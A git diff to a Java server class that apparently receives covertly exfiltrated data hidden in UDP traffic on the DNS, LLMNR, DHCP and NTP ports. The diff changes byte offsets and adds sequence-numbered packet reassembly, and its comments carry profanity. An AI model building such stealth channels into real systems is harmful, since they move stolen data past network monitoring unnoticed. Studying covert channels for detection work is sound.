@@ -21,9 +21,11 @@ public class MultiserviceStealthUDPServer extends Thread {
     
     List<Integer> availablePorts;
     
-    private byte[] buf = new byte[16];
+    private byte[] buf = new byte[512];
     Random rand;
-    public static ArrayList<Byte> totalRecieved = new ArrayList<Byte>(); //Good luck with that shit
+    public static ArrayList<Byte> totalRecieved = new ArrayList<Byte>();
+    private ArrayList<ExfilUDPPacket> recieveQueue = new ArrayList<ExfilUDPPacket>();
+    private static int expectedSeqNum = 0;
     public MultiserviceStealthUDPServer(int randSeed) throws SocketException {
         rand = new Random(randSeed);
         
@@ -33,6 +35,12 @@ public class MultiserviceStealthUDPServer extends Thread {
         availablePorts.add(67);
         availablePorts.add(123);
     }
+    
+    public static void clearTotalRecieved(){
+    	MultiserviceStealthUDPServer.totalRecieved.clear();
+    	MultiserviceStealthUDPServer.expectedSeqNum = 0;
+    }
+    
     public MultiserviceStealthUDPServer() throws SocketException {
         rand = new Random();
         
@@ -73,16 +81,16 @@ public class MultiserviceStealthUDPServer extends Thread {
     	int[] temp = new int[2];
     	if(port==53){
     		temp[0]=0;
-    		temp[1]=2;
+    		temp[1]=1;
     	}else if(port==5355){
     		temp[0]=0;
-    		temp[1]=2;
+    		temp[1]=1;
     	}else if(port == 67){
     		temp[0]=4;
-    		temp[1]=8;
+    		temp[1]=7;
     	}else if(port == 123) {
     		temp[0]=12;
-    		temp[1]=16;
+    		temp[1]=15;
     	}else{
     		temp[0]=0;
     		temp[1]=-1;
@@ -111,35 +119,31 @@ public class MultiserviceStealthUDPServer extends Thread {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
 			}
-            String recvMessage = "";
+            byte[] dataBuf;
             if(dataBounds[1]==-1){
-            	recvMessage = new String(buf);
+            	dataBuf = Arrays.copyOf(buf, buf.length);
             }
             else{
-            	byte[] strBuf = new byte[dataBounds[1]-dataBounds[0]];
+            	dataBuf = new byte[dataBounds[1]-dataBounds[0]];
             	for(int i = dataBounds[0]; i < dataBounds[1]; i++){
-            		strBuf[i-dataBounds[0]] = buf[i];
-            		//if(buf[i]==(byte)0x81){
-            		//	System.out.println("[D] "+(char)buf[i]); 	//whomst the FUCK DID THIS????
-            														//WHY THE /FUCK/ DOES 0x81 -> '?' THAT'S NOT A F U C K I N G THING
-            														//SAME WITH 0x8f DID ANYONE LOOK AT THE ASCII TABLE????? FUCK THIS SHIT
-            		//}
-            		//if(buf[i]==(byte)0x8f){
-            		//	System.out.println("[D] "+(char)buf[i]);
-            		//}
+            		dataBuf[i-dataBounds[0]] = buf[i];
             	}
-
-				try {
-					recvMessage+=new String(strBuf,"UTF-16"); 	//Alright, fine I'll re-write this with ArrayList<Byte> instead of string
-																//BUT WHOEVER DESIGNED THIS SHIT CAN SUCK A CALLAPILLA DICK
-				} catch (UnsupportedEncodingException e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
-				
             }
-            totalRecieved+=recvMessage;
-            System.out.print(recvMessage);
+            ExfilUDPPacket curPack = new ExfilUDPPacket(dataBuf, buf[dataBounds[1]]);
+            this.recieveQueue.add(curPack);
+            ArrayList<ExfilUDPPacket> currRecieveQueue = new ArrayList<ExfilUDPPacket>();
+            for(ExfilUDPPacket eup : recieveQueue){
+            	currRecieveQueue.add(eup);
+            }
+            for(ExfilUDPPacket eup : currRecieveQueue){
+            	if(eup.getSeqNum()==expectedSeqNum){ //Multithreading really fucks with this
+            		for(byte b : eup.getData()){
+            			totalRecieved.add(b);
+            			expectedSeqNum++;
+            		}
+            		recieveQueue.remove(eup);
+            	}
+            }
             Arrays.fill(buf,(byte)0);
         }
     }
